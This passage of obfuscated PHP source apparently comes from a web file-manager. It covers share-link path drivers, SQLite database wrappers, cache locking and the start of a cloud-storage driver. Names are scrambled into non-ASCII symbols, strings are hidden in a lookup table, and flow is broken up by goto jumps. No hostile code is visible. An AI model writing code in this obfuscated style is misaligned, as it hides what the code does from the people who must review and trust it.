(!$F’£•õÎ¾Ğ) { return array(); } $c ¡ââä‘ = $this->model->listAll($CÀÂ•ˆ«ÛÑ); foreach ($c ¡ââä‘ as &$DÕÇ­Ö¾ªÎ) { $DÕÇ­Ö¾ªÎ[$DõŸ‡ƒì¸Û[391]] = Action($DõŸ‡ƒì¸Û[1005])->shareItemInfo($DÕÇ­Ö¾ªÎ[$DõŸ‡ƒì¸Û[391]]); } return $c ¡ââä‘; } } class PathDriverDriverShareItem { public function __construct($c™ÃÁ­Œ›ô) { $this->pathParse = $c™ÃÁ­Œ›ô; } public function __call($cåÓºÓ‰¦Ÿ, $Fİ¥ƒ¥·Øæ) { $E‚§»ààŒã =& $_SERVER[“]; if (method_exists($this, $cåÓºÓ‰¦Ÿ)) { return; } $f–òôßÂ = call_user_func_array(array($E‚§»ààŒã[1112], $cåÓºÓ‰¦Ÿ), $Fİ¥ƒ¥·Øæ); $c‘É›éË = array($E‚§»ààŒã[1113], $E‚§»ààŒã[1114], $E‚§»ààŒã[1115], $E‚§»ààŒã[1116], $E‚§»ààŒã[492], $E‚§»ààŒã[494], $E‚§»ààŒã[1117], $E‚§»ààŒã[103], $E‚§»ààŒã[1118], $E‚§»ààŒã[1119]); if (in_array($cåÓºÓ‰¦Ÿ, $c‘É›éË)) { $f–òôßÂ = $this->getPathOuter($f–òôßÂ); } return $f–òôßÂ; } public function copy($a¿›¬½Ú¦¶, $C×ôÙ¾® ‘, $B¦½Í·óõ = false) { return $this->copyMove($a¿›¬½Ú¦¶, $C×ôÙ¾® ‘, $B¦½Í·óõ, $_SERVER[“][492]); } public function move($fİÜ×’¬ŒÕ, $a²µŒ…ƒİ, $F¿®¬êŞˆ— = false) { return $this->copyMove($fİÜ×’¬ŒÕ, $a²µŒ…ƒİ, $F¿®¬êŞˆ—, $_SERVER[“][494]); } private function copyMove($dÙèÃÓ†ë¡, $c…šÕ‘‹Õ­, $eïª„‡‚®, $dã¯è“‘Õ¸) { goto EÌÉôÔÄ…š; CâòÇğë¹: return $b§ŒÜÄƒ©; goto C‹Ëßïê³ì; EÌÉôÔÄ…š: $F³•‘¤·ƒ =& $_SERVER[“]; $b¸®éªíŸ = $c…šÕ‘‹Õ­; $C»¥™·©Ú = IO::driverMake($c…šÕ‘‹Õ­); goto D›ôÎ²‘î¥; D›ôÎ²‘î¥: if ($C»¥™·©Ú->pathParse[$F³•‘¤·ƒ[985]]) { $c…šÕ‘‹Õ­ = $C»¥™·©Ú->pathParse[$F³•‘¤·ƒ[985]]; } else { $c…šÕ‘‹Õ­ = $b¸®éªíŸ; } $b§ŒÜÄƒ© = IO::copyMove($dÙèÃÓ†ë¡, $c…šÕ‘‹Õ­, $eïª„‡‚®, $dã¯è“‘Õ¸); $b§ŒÜÄƒ© = $this->getPathOuter($b§ŒÜÄƒ©); goto CâòÇğë¹; C‹Ëßïê³ì: } public function pathFather($føó‹Ğ¯ÔÀ) { return get_path_father($this->pathParse[$_SERVER[“][75]]); } public function iconvSystem($bèÈ˜à‚ì¬) { return $bèÈ˜à‚ì¬; } protected function infoParse($CŞ¿¥¦ÆŠ™, $A©ãÚÑ»…‹ = false) { $aÉ˜¹Ä„éÎ =& $_SERVER[“]; $EœÛµùƒ‹õ = $this->pathParse[$aÉ˜¹Ä„éÎ[439]][$aÉ˜¹Ä„éÎ[1006]] . $this->pathParse[$aÉ˜¹Ä„éÎ[999]]; if ($A©ãÚÑ»…‹) { $E‚ñ²ª´‰ = IO::infoWithChildren($EœÛµùƒ‹õ); } else { $E‚ñ²ª´‰ = IO::info($EœÛµùƒ‹õ); } $fÛ‚¯Íñ“ = $this->pathParse[$aÉ˜¹Ä„éÎ[439]]; return Action($aÉ˜¹Ä„éÎ[1111])->_shareItemeParse($E‚ñ²ª´‰, $fÛ‚¯Íñ“); } public function listAll($CÉ À´ÖÒŒ) { $dï¶š‡ğáÍ =& $_SERVER[“]; $a—¨¾ÜÚ•ñ = IO::listAll($CÉ À´ÖÒŒ); $f„ˆ²‘é¼µ = $this->pathParse[$dï¶š‡ğáÍ[439]]; foreach ($a—¨¾ÜÚ•ñ as &$FÚÅÃ„àí) { check_abort(); $FÚÅÃ„àí = array_merge(IO::info($FÚÅÃ„àí[$dï¶š‡ğáÍ[75]]), $FÚÅÃ„àí); $FÚÅÃ„àí[$dï¶š‡ğáÍ[391]] = Action($dï¶š‡ğáÍ[1111])->_shareItemeParse($FÚÅÃ„àí, $f„ˆ²‘é¼µ); } return $a—¨¾ÜÚ•ñ; } public function getPathOuter($Dš¸«êë¯â) { goto C«ãŞ‹ÌÃ…; C«ãŞ‹ÌÃ…: $F‹ÈÔ¥Àó… =& $_SERVER[“]; $A¬Àæ½Ò¼³ = KodIO::parse($Dš¸«êë¯â); if ($A¬Àæ½Ò¼³[$F‹ÈÔ¥Àó…[29]] == KodIO::KOD_SHARE_ITEM) { return $A¬Àæ½Ò¼³[$F‹ÈÔ¥Àó…[75]]; } goto eÊæÙ·‚É; eÊæÙ·‚É: $a£Ë†ö¼µŸ = KodIO::clear($Dš¸«êë¯â); $F·¥âŒ‹¬ = KodIO::clear($this->pathParse[$F‹ÈÔ¥Àó…[439]][$F‹ÈÔ¥Àó…[1006]]); $c ƒèÁ¦ÈÌ = substr($a£Ë†ö¼µŸ, strlen($F·¥âŒ‹¬)); goto Aéêà¡Ãæ; Aéêà¡Ãæ: if (substr($a£Ë†ö¼µŸ, 0, strlen($F·¥âŒ‹¬)) != $F·¥âŒ‹¬) { return !1; } return $this->pathParse[$F‹ÈÔ¥Àó…[1000]] . $F‹ÈÔ¥Àó…[8] . ltrim($c ƒèÁ¦ÈÌ, $F‹ÈÔ¥Àó…[8]); goto f¥ç„é¬“Ï; f¥ç„é¬“Ï: } public function getType() { $Cç¨¶… ã» =& $_SERVER[“]; $C¡µÁ÷Ù = str_replace($Cç¨¶… ã»[71], $Cç¨¶… ã»[33], get_class($this)); return strtolower($C¡µÁ÷Ù); } public function isTypeObject($f™ô³¥²¼º) { return IO::isTypeObject($f™ô³¥²¼º); } public function info($a¡ÀĞñÍ¯î) { return $this->infoParse($a¡ÀĞñÍ¯î); } public function infoAuth($aª»ªèù‘) { return $this->infoParse($aª»ªèù‘); } public function infoWithChildren($BÖ¼”—ç³) { return $this->infoParse($BÖ¼”—ç³, !0); } public function infoFull($B¸„¯í¾¥±) { return $this->infoParse($B¸„¯í¾¥±); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eö–îƒ»î) { $this->pathParse = $eö–îƒ»î; } protected function infoParse($BÔ‚ˆ•óçã, $FÔœ‰Û©É„ = false) { $B»±øĞ‚¹õ =& $_SERVER[“]; return Action($B»±øĞ‚¹õ[1005])->sharePathInfo($this->pathParse[$B»±øĞ‚¹õ[75]], !0, $FÔœ‰Û©É„); } public function listPath($f›©ØêŠŸƒ, $dª…÷ƒ²Ğï = false) { $Eâª™Šõ‡Ì =& $_SERVER[“]; $f‰“…ÍÒ = IO::listPath($f›©ØêŠŸƒ, $dª…÷ƒ²Ğï); foreach ($f‰“…ÍÒ as $Fµ™ò˜ôäë => $f¼Ş°œ›®) { if (!in_array($Fµ™ò˜ôäë, array($Eâª™Šõ‡Ì[73], $Eâª™Šõ‡Ì[74]))) { continue; } foreach ($f¼Ş°œ›® as $bĞ ÙÔ·¥ä => $BãŸÆğµÓù) { $BãŸÆğµÓù = Action($Eâª™Šõ‡Ì[1120])->parsePathChildren($BãŸÆğµÓù, array($Eâª™Šõ‡Ì[387] => $f›©ØêŠŸƒ)); $f‰“…ÍÒ[$Fµ™ò˜ôäë][$bĞ ÙÔ·¥ä] = Action($Eâª™Šõ‡Ì[1005])->shareItemInfo($BãŸÆğµÓù); } } return $f‰“…ÍÒ; } public function listAll($eõò™Èœ) { $c±†šœ¼¤‰ =& $_SERVER[“]; $a•ù’¶Ùà = IO::listAll($eõò™Èœ); foreach ($a•ù’¶Ùà as &$E±µÃÁï¬‘) { $E±µÃÁï¬‘ = array_merge(IO::info($E±µÃÁï¬‘[$c±†šœ¼¤‰[75]]), $E±µÃÁï¬‘); $E±µÃÁï¬‘[$c±†šœ¼¤‰[391]] = Action($c±†šœ¼¤‰[1005])->shareItemInfo($E±µÃÁï¬‘); } return $a•ù’¶Ùà; } } goto F¦÷Á¡ºä–; DÒÏéŒá¢×: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto D×Şù¸™…ª; Bïê¥ˆ¹ª: $this->tpl = TEMPLATE . MOD . $Dˆ·ïç°[8]; $this->_classObjectID = mt_rand(0, 10000); goto cÚß¼’†­Â; bï³—Ê÷ÙÜ: $this->in =& $in; $this->values[$Dˆ·ïç°[6]] =& $config; $this->values[$Dˆ·ïç°[7]] =& $in; goto Bïê¥ˆ¹ª; D×Şù¸™…ª: $Dˆ·ïç° =& $_SERVER[“]; global $in, $config; $this->config =& $config; goto bï³—Ê÷ÙÜ; cÚß¼’†­Â: } public function loadClass($aÆ‘Ş§ŠÍ‡) { if (1 === func_num_args()) { $this->{$aÆ‘Ş§ŠÍ‡} = new $aÆ‘Ş§ŠÍ‡(); } else { $eå°œ¢¢… = new ReflectionClass($aÆ‘Ş§ŠÍ‡); $AéÁí½²İÑ = func_get_args(); array_shift($AéÁí½²İÑ); $this->{$aÆ‘Ş§ŠÍ‡} = $eå°œ¢¢…->newInstanceArgs($AéÁí½²İÑ); } return $this->{$aÆ‘Ş§ŠÍ‡}; } protected function assign($bëô¶éÉ—, $CÚî‰Ë”±É) { $this->values[$bëô¶éÉ—] = $CÚî‰Ë”±É; } protected function display($Eğ»í›å×) { ob_end_clean(); extract($this->values); require $this->tpl . $Eğ»í›å×; } } class DbSqliteBase extends Db { public function __construct($eÊšª–ŠôŸ = '') { $e»Öˆğ¼… =& $_SERVER[“]; if (!extension_loaded($e»Öˆğ¼…[9])) { think_exception(think_lang($e»Öˆğ¼…[10]) . $e»Öˆğ¼…[11]); } if (!empty($eÊšª–ŠôŸ)) { if (!isset($eÊšª–ŠôŸ[$e»Öˆğ¼…[12]])) { $eÊšª–ŠôŸ[$e»Öˆğ¼…[12]] = 438; } $this->config = $eÊšª–ŠôŸ; if (empty($this->config[$e»Öˆğ¼…[13]])) { $this->config[$e»Öˆğ¼…[13]] = array(); } } } public function connect($cÁ¤Œœöá¡ = '', $CÔâ‰Şº›‡ = 0) { $bë´ßĞó‰ =& $_SERVER[“]; if (!isset($this->linkID[$CÔâ‰Şº›‡])) { goto eÏ˜»–İÄˆ; eÏ˜»–İÄˆ: if (empty($cÁ¤Œœöá¡)) { $cÁ¤Œœöá¡ = $this->config; } $aâÌá‘ëÙ = !empty($cÁ¤Œœöá¡[$bë´ßĞó‰[13]][$bë´ßĞó‰[14]]) ? $cÁ¤Œœöá¡[$bë´ßĞó‰[13]][$bë´ßĞó‰[14]] : $this->pconnect; $F²¸ÒŸ¤Ó³ = $aâÌá‘ëÙ ? $bë´ßĞó‰[15] : $bë´ßĞó‰[16]; goto EÍ‰¥¿Ÿëá; EÍ‰¥¿Ÿëá: $this->linkID[$CÔâ‰Şº›‡] = $F²¸ÒŸ¤Ó³($cÁ¤Œœöá¡[$bë´ßĞó‰[17]], $cÁ¤Œœöá¡[$bë´ßĞó‰[12]]); if (!$this->linkID[$CÔâ‰Şº›‡]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a­’Ã²“‘; a­’Ã²“‘: @sqlite_busy_timeout($this->linkID[$CÔâ‰Şº›‡], 30000); if (1 != think_config($bë´ßĞó‰[18])) { unset($this->config); } goto dÄ¤ù¼Ù¿; dÄ¤ù¼Ù¿: } return $this->linkID[$CÔâ‰Şº›‡]; } public function free() { $this->queryID = null; } public function query($E›«¾†¶ÅÕ) { goto c¾‚ÏóÄäÁ; eœå›Üğ±: $this->queryStr = $E›«¾†¶ÅÕ; if ($this->queryID) { $this->free(); } think_action_status($FÙ£é‰Ü‡÷[19], 1); goto EŠíâ¹Îæî; c¾‚ÏóÄäÁ: $FÙ£é‰Ü‡÷ =& $_SERVER[“]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eœå›Üğ±; Då¤ùŒëĞ‡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $FÔƒá‹©Èê = $this->getAll(); return $FÔƒá‹©Èê; } goto dùº“º®¿; EŠíâ¹Îæî: think_status($FÙ£é‰Ü‡÷[20]); $this->queryID = sqlite_query($this->_linkID, $E›«¾†¶ÅÕ); $this->debug(); goto Då¤ùŒëĞ‡; dùº“º®¿: } public function execute($DÍÏÎƒ†ß) { goto F½Ç´¼¯¥; e¦ÈÑãÉŠí: if (!1 === $a¯îØ¿Êèå) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Fñ…±ï½Œ; Bä‘¼Á¡Î: think_status($C®èÌö¼Å[20]); $a¯îØ¿Êèå = sqlite_exec($this->_linkID, $DÍÏÎƒ†ß); $this->debug(); goto e¦ÈÑãÉŠí; d²¹ì¨òãŒ: $this->queryStr = $DÍÏÎƒ†ß; if ($this->queryID) { $this->free(); } think_action_status($C®èÌö¼Å[21], 1); goto Bä‘¼Á¡Î; F½Ç´¼¯¥: $C®èÌö¼Å =& $_SERVER[“]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d²¹ì¨òãŒ; Fñ…±ï½Œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[“][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E¡ô§½±‡Ş = sqlite_query($this->_linkID, $_SERVER[“][23]); if (!$E¡ô§½±‡Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eìŒª£ª‰ = sqlite_query($this->_linkID, $_SERVER[“][24]); if (!$eìŒª£ª‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dİŞ†‡ƒÖ = array(); if ($this->numRows > 0) { for ($eØ‹±†ì›Œ = 0; $eØ‹±†ì›Œ < $this->numRows; $eØ‹±†ì›Œ++) { $dİŞ†‡ƒÖ[$eØ‹±†ì›Œ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dİŞ†‡ƒÖ; } public function getFields($C‘×øå…¹) { $F¹—ÊŠ¾ˆ =& $_SERVER[“]; $bãô‡ÊÇ = $this->query($F¹—ÊŠ¾ˆ[25] . $C‘×øå…¹ . $F¹—ÊŠ¾ˆ[26]); $c‹ÇØœ‡óª = array(); if ($bãô‡ÊÇ) { foreach ($bãô‡ÊÇ as $DßéğÏ¹ => $D‰Â—èĞ¬î) { $c‹ÇØœ‡óª[$D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[27]]] = array($F¹—ÊŠ¾ˆ[28] => $D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[27]], $F¹—ÊŠ¾ˆ[29] => $D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[30]], $F¹—ÊŠ¾ˆ[31] => (bool) ($D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[32]] === $F¹—ÊŠ¾ˆ[33]), $F¹—ÊŠ¾ˆ[34] => $D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[35]], $F¹—ÊŠ¾ˆ[36] => strtolower($D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[37]]) == $F¹—ÊŠ¾ˆ[38], $F¹—ÊŠ¾ˆ[39] => strtolower($D‰Â—èĞ¬î[$F¹—ÊŠ¾ˆ[40]]) == $F¹—ÊŠ¾ˆ[41]); } } return $c‹ÇØœ‡óª; } public function getTables($Aá–‰ÕŒÈÓ = '') { $CŒÔÜƒŒÖ· =& $_SERVER[“]; $d„ÜÇõ¤å¯ = $this->query($CŒÔÜƒŒÖ·[42] . $CŒÔÜƒŒÖ·[43] . $CŒÔÜƒŒÖ·[44]); $D†íÚ°Ï™Ú = array(); foreach ($d„ÜÇõ¤å¯ as $aÈ¬Çà®¶ => $bôÁ¤  Úâ) { $D†íÚ°Ï™Ú[$aÈ¬Çà®¶] = current($bôÁ¤  Úâ); } return $D†íÚ°Ï™Ú; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $a¾öÜ¹èÃ =& $_SERVER[“]; $c²ãŸ¤İ‹ = sqlite_last_error($this->_linkID); $this->error = $c²ãŸ¤İ‹ . $a¾öÜ¹èÃ[4] . sqlite_error_string($c²ãŸ¤İ‹); if ($a¾öÜ¹èÃ[33] != $this->queryStr) { $this->error .= LNG($a¾öÜ¹èÃ[45]) . $this->queryStr; } think_trace($this->error, $a¾öÜ¹èÃ[33], $a¾öÜ¹èÃ[46]); return $this->error; } public function escapeString($dàòÆ¤ö–İ) { return sqlite_escape_string($dàòÆ¤ö–İ); } public function parseLimit($bâÙ´ƒÜ) { $CŒ¦œ¬„ºŠ =& $_SERVER[“]; $C—ÎĞƒŒ£ = $CŒ¦œ¬„ºŠ[33]; if (!empty($bâÙ´ƒÜ)) { $bâÙ´ƒÜ = explode($CŒ¦œ¬„ºŠ[47], $bâÙ´ƒÜ); if (count($bâÙ´ƒÜ) > 1) { $C—ÎĞƒŒ£ .= $CŒ¦œ¬„ºŠ[48] . $bâÙ´ƒÜ[1] . $CŒ¦œ¬„ºŠ[49] . $bâÙ´ƒÜ[0] . $CŒ¦œ¬„ºŠ[50]; } else { $C—ÎĞƒŒ£ .= $CŒ¦œ¬„ºŠ[48] . $bâÙ´ƒÜ[0] . $CŒ¦œ¬„ºŠ[50]; } } return $C—ÎĞƒŒ£; } } class DbSqlite3Base extends Db { public function __construct($DôƒŸÎŠß† = '') { $aõ¤ òĞä =& $_SERVER[“]; if (!class_exists($aõ¤ òĞä[51])) { think_exception(think_lang($aõ¤ òĞä[10]) . $aõ¤ òĞä[52]); } if (!empty($DôƒŸÎŠß†)) { if (!isset($DôƒŸÎŠß†[$aõ¤ òĞä[12]])) { $DôƒŸÎŠß†[$aõ¤ òĞä[12]] = 438; } $this->config = $DôƒŸÎŠß†; if (empty($this->config[$aõ¤ òĞä[13]])) { $this->config[$aõ¤ òĞä[13]] = array(); } } } public function connect($cÊö¿ê“¿ = '', $DŠ™»Ê‚Èó = 0) { $c¬ÄÂÏËÃï =& $_SERVER[“]; if (!isset($this->linkID[$DŠ™»Ê‚Èó])) { if (empty($cÊö¿ê“¿)) { $cÊö¿ê“¿ = $this->config; } $this->linkID[$DŠ™»Ê‚Èó] = new SQLite3($cÊö¿ê“¿[$c¬ÄÂÏËÃï[17]]); if (!$this->linkID[$DŠ™»Ê‚Èó]) { think_exception($this->linkID[$DŠ™»Ê‚Èó]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$DŠ™»Ê‚Èó]->busyTimeout(30000); if (1 != think_config($c¬ÄÂÏËÃï[18])) { unset($this->config); } } return $this->linkID[$DŠ™»Ê‚Èó]; } public function free() { $this->queryID = null; } public function query($d±ÕÊ´»×Ñ) { goto D§éÖ«çè™; BÙ¶ƒĞÙ¥: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eŸ„­Ÿ“öÀ = $this->getAll(); $this->numRows = count($eŸ„­Ÿ“öÀ); return $eŸ„­Ÿ“öÀ; } goto B…È°äèö‰; E“¨²´Î‘¼: think_status($eŒ¦†‚¢…Ê[20]); $this->queryID = $this->_linkID->query($d±ÕÊ´»×Ñ); $this->debug(); goto BÙ¶ƒĞÙ¥; D§éÖ«çè™: $eŒ¦†‚¢…Ê =& $_SERVER[“]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d‘±­›ãÎÃ; d‘±­›ãÎÃ: $this->queryStr = $d±ÕÊ´»×Ñ; if ($this->queryID) { $this->free(); } think_action_status($eŒ¦†‚¢…Ê[19], 1); goto E“¨²´Î‘¼; B…È°äèö‰: } public function execute($BÒœê¹òìÕ) { goto A‚ó‹ŸÖé; A‚ó‹ŸÖé: $eÊÜŒñã°ò =& $_SERVER[“]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DöáùÕƒĞî; DöáùÕƒĞî: $this->queryStr = $BÒœê¹òìÕ; if ($this->queryID) { $this->free(); } think_action_status($eÊÜŒñã°ò[21], 1); goto a¬ÓØ†ª‘; Bµã°¥…Ğ: if (!1 === $f¡åãšƒ¢Ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto AÌóÔŸùß; a¬ÓØ†ª‘: think_status($eÊÜŒñã°ò[20]); $f¡åãšƒ¢Ü = $this->_linkID->exec($BÒœê¹òìÕ); $this->debug(); goto Bµã°¥…Ğ; AÌóÔŸùß: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[“][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E‹‹øÔ˜´ = $this->_linkID->query($_SERVER[“][23]); if (!$E‹‹øÔ˜´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EîË«ì¯°æ = $this->_linkID->query($_SERVER[“][24]); if (!$EîË«ì¯°æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aÇ¾§‰§˜« = array(); while ($C“ƒÜöİòš = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $aÇ¾§‰§˜«[] = $C“ƒÜöİòš; } $this->queryID->reset(); return $aÇ¾§‰§˜«; } public function getFields($f“×¢’†£) { $añë¾ÌŠ” =& $_SERVER[“]; $Eƒ†²»ßŞ¸ = $this->query($añë¾ÌŠ”[25] . $f“×¢’†£ . $añë¾ÌŠ”[26]); $Bïï‰™£Ô = array(); if ($Eƒ†²»ßŞ¸) { foreach ($Eƒ†²»ßŞ¸ as $fß äÓå•í => $Déîœ¾µ‘î) { $Bïï‰™£Ô[$Déîœ¾µ‘î[$añë¾ÌŠ”[28]]] = array($añë¾ÌŠ”[28] => $Déîœ¾µ‘î[$añë¾ÌŠ”[28]], $añë¾ÌŠ”[29] => $Déîœ¾µ‘î[$añë¾ÌŠ”[29]], $añë¾ÌŠ”[31] => (bool) ($Déîœ¾µ‘î[$añë¾ÌŠ”[31]] === $añë¾ÌŠ”[33]), $añë¾ÌŠ”[34] => $Déîœ¾µ‘î[$añë¾ÌŠ”[53]], $añë¾ÌŠ”[36] => (bool) $Déîœ¾µ‘î[$añë¾ÌŠ”[54]], $añë¾ÌŠ”[39] => (bool) $Déîœ¾µ‘î[$añë¾ÌŠ”[54]]); } } return $Bïï‰™£Ô; } public function getTables($F¡–ŠÚĞö… = '') { $fõñ¼Öç· =& $_SERVER[“]; $aœ±ØØ©Ö‹ = $this->query($fõñ¼Öç·[42] . $fõñ¼Öç·[43] . $fõñ¼Öç·[44]); $Dï¦¼Ï¦Øë = array(); foreach ($aœ±ØØ©Ö‹ as $aÙŒŒÎ™°– => $aŞ¢èƒÑ÷) { $Dï¦¼Ï¦Øë[$aÙŒŒÎ™°–] = current($aŞ¢èƒÑ÷); } return $Dï¦¼Ï¦Øë; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fÂßİÓÈÔ× =& $_SERVER[“]; $this->error = $this->_linkID->lastErrorMsg(); if ($fÂßİÓÈÔ×[33] != $this->queryStr) { $this->error .= LNG($fÂßİÓÈÔ×[45]) . $this->queryStr; } think_trace($this->error, $fÂßİÓÈÔ×[33], $fÂßİÓÈÔ×[46]); return $this->error; } public function escapeString($AÛ™°’âç) { $AõÓ¡§¼«¿ =& $_SERVER[“]; if ($this->_linkID) { return $this->_linkID->escapeString($AÛ™°’âç); } return str_ireplace($AõÓ¡§¼«¿[55], $AõÓ¡§¼«¿[56], $AÛ™°’âç); } public function parseLimit($døÆ‡»ã‘ù) { $B«÷Í‘³Çñ =& $_SERVER[“]; $aâÇãÔ§ñÕ = $B«÷Í‘³Çñ[33]; if (!empty($døÆ‡»ã‘ù)) { $døÆ‡»ã‘ù = explode($B«÷Í‘³Çñ[47], $døÆ‡»ã‘ù); if (count($døÆ‡»ã‘ù) > 1) { $aâÇãÔ§ñÕ .= $B«÷Í‘³Çñ[48] . $døÆ‡»ã‘ù[1] . $B«÷Í‘³Çñ[49] . $døÆ‡»ã‘ù[0] . $B«÷Í‘³Çñ[50]; } else { $aâÇãÔ§ñÕ .= $B«÷Í‘³Çñ[48] . $døÆ‡»ã‘ù[0] . $B«÷Í‘³Çñ[50]; } } return $aâÇãÔ§ñÕ; } } goto c‰»‡§ö¡¥; D¶ä²İ’Î„: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a†Ü×Š® =& $_SERVER[“]; $Fƒ”À¡½È÷ = $GLOBALS[$a†Ü×Š®[6]][$a†Ü×Š®[337]]; self::$cachePath = $Fƒ”À¡½È÷[$a†Ü×Š®[167]][$a†Ü×Š®[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Fêà×õáê, $E¶ÑÓî–È = 0) { goto B†Ñ˜¥Ô¸Á; EÃğ†ãê¶ù: $A–ğ™„ğÈ‹ = rtrim(self::$cachePath, $F¾ïµ®ÀŠˆ[8]) . $F¾ïµ®ÀŠˆ[757] . md5($Fêà×õáê) . $F¾ïµ®ÀŠˆ[758]; if (file_exists($A–ğ™„ğÈ‹) && filemtime($A–ğ™„ğÈ‹) && filemtime($A–ğ™„ğÈ‹) < time() - 10) { @unlink($A–ğ™„ğÈ‹); } do { if (file_exists($A–ğ™„ğÈ‹)) { cacheLockWait(); continue; } $F«¯ï…‡¶ = fopen($A–ğ™„ğÈ‹, $F¾ïµ®ÀŠˆ[759]); if (!$F«¯ï…‡¶) { return !1; } $fËæšîñ¬ = flock($F«¯ï…‡¶, LOCK_EX | LOCK_NB); self::$caches[$Fêà×õáê] = array($F¾ïµ®ÀŠˆ[760] => $F«¯ï…‡¶, $F¾ïµ®ÀŠˆ[167] => $A–ğ™„ğÈ‹); fwrite($F«¯ï…‡¶, $Aôë†¸ÛÓ); clearstatcache(); if ($F«¯ï…‡¶ && $fËæšîñ¬) { return !0; } cacheLockWait(); } while (microtime(!0) < $Aôë†¸ÛÓ); goto B¿¯ÂÕÛÑà; B†Ñ˜¥Ô¸Á: $F¾ïµ®ÀŠˆ =& $_SERVER[“]; $E­¸®¼åŞÍ = microtime(!0); $Aôë†¸ÛÓ = $E­¸®¼åŞÍ + $E¶ÑÓî–È + 0.0001; goto EÃğ†ãê¶ù; B¿¯ÂÕÛÑà: $this->unlock($Fêà×õáê); return !1; goto dì¬Šßğö; dì¬Šßğö: } public function lockGet($a¯Ü±‹Ğ×á) { $cÏƒ¾‹¸¤Ø =& $_SERVER[“]; $bÔ¬ÛõôĞ = rtrim(self::$cachePath, $cÏƒ¾‹¸¤Ø[8]) . $cÏƒ¾‹¸¤Ø[757] . md5($a¯Ü±‹Ğ×á) . $cÏƒ¾‹¸¤Ø[758]; return file_exists($bÔ¬ÛõôĞ); } public function unlock($c¹Û«ùß½ç) { goto f‘±¤â·ºÌ; a£Ù„µ…¬Ã: unset(self::$caches[$c¹Û«ùß½ç]); goto d’ĞÇÃë˜‘; f‘±¤â·ºÌ: $F‡õš”å›§ =& $_SERVER[“]; $EŒÄøÉÚãŸ = self::$caches[$c¹Û«ùß½ç]; if (!$EŒÄøÉÚãŸ) { return; } goto B±î×‡Ò‰; B±î×‡Ò‰: @flock($EŒÄøÉÚãŸ[$F‡õš”å›§[760]], LOCK_UN); @fclose($EŒÄøÉÚãŸ[$F‡õš”å›§[760]]); @unlink($EŒÄøÉÚãŸ[$F‡õš”å›§[167]]); goto a£Ù„µ…¬Ã; d’ĞÇÃë˜‘: } } class CacheLockRedis { public function lock($b–òÚ‰„åÈ, $c®Šùµğ¢ = 10) { $C¬œ‰Ì¶ë = Cache::init(); $C¿¨Æï¤º’ = microtime(!0) + $c®Šùµğ¢; while (microtime(!0) < $C¿¨Æï¤º’) { $d½¾¥§¨½ = $C¬œ‰Ì¶ë->get($b–òÚ‰„åÈ); if (!$d½¾¥§¨½) { $c»Ñ¦õ¤á„ = $C¬œ‰Ì¶ë->setLock($b–òÚ‰„åÈ, $C¿¨Æï¤º’, $c®Šùµğ¢); if ($c»Ñ¦õ¤á„) { return !0; } } else { if ($d½¾¥§¨½ < microtime(!0)) { $C¬œ‰Ì¶ë->set($b–òÚ‰„åÈ, $C¿¨Æï¤º’, $C¿¨Æï¤º’); if ($C¬œ‰Ì¶ë->get($b–òÚ‰„åÈ) === $d½¾¥§¨½) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($fˆÔ’ó’˜) { return Cache::init()->get($fˆÔ’ó’˜); } public function unlock($CËì“ĞÂĞÒ) { return Cache::init()->remove($CËì“ĞÂĞÒ); } } goto Få×µÎÖ˜Ì; c§æËÔÚ×: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\57\166\x30\56\141\x70\x69\x2e\165\160\171\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($cÉÇº™¦) { parent::__construct(); $this->_init($cÉÇº™¦); } public function _init($F¹æ½ÏŠ«ë) { foreach ($F¹æ½ÏŠ«ë as $CŸß„±ƒ…Ï => $C¢Øó·Ò§) { if (isset($this->{$CŸß„±ƒ…Ï})) { $this->{$CŸß„±ƒ…Ï} = $C¢Øó·Ò§; } } if 